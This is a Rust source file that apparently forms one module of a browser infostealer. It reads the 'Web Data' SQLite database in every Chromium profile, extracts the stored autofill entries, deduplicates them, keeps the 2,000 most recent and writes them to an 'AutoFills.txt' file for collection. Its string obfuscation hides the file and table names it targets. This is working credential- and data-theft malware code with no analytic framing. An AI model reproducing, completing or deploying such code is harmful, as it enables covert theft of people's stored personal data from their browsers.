use alloc::boxed::Box;
use sqlite::{DatabaseReader, TableRecord, TableRecordExtension};
use alloc::string::{String, ToString};
use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use crate::AutoFill;
use crate::chromium::Browser;
use obfstr::obfstr as s;
use sqlite::read_sqlite3_database_by_bytes;

const AUTOFILL_NAME: usize           = 0;
const AUTOFILL_VALUE: usize          = 1;
const AUTOFILL_DATE_LAST_USED: usize = 4;

pub(super) struct AutoFillTask {
    browser: Arc<Browser>,
}

impl AutoFillTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for AutoFillTask {
    parent_name!("AutoFills.txt");
    
    unsafe fn run(&self, parent: &Path) {
        let mut autofills: Vec<AutoFill> = self.browser
            .profiles
            .iter()
            .filter_map(|profile| get_autofills(profile))
            .flat_map(|v| v.into_iter())
            .collect();
        
        if autofills.is_empty() {
            return
        }
        
        autofills.sort();
        autofills.dedup();

        autofills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
        autofills.truncate(2000);

        let _ = autofills
            .iter()
            .map(|autofill| autofill.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }
}

fn get_autofills(profile: &Path) -> Option<Vec<AutoFill>> {
    let cookies_path = profile / s!("Web Data");
    let bytes = cookies_path.read_file().ok()?;

    let db = read_sqlite3_database_by_bytes(&bytes)?;
    let table = db.read_table(s!("Autofill"))?;
    
    let autofills = table
        .filter_map(|record| extract_autofill_from_record(&record))
        .collect();
    
    Some(autofills)
}

fn extract_autofill_from_record(record: &Box<dyn TableRecord>) -> Option<AutoFill> {
    let name = record.get_value(AUTOFILL_NAME)?.as_string()?.clone();
    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?.clone();
    let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
    
    Some(AutoFill {
        name,
        value,
        last_used
    })
}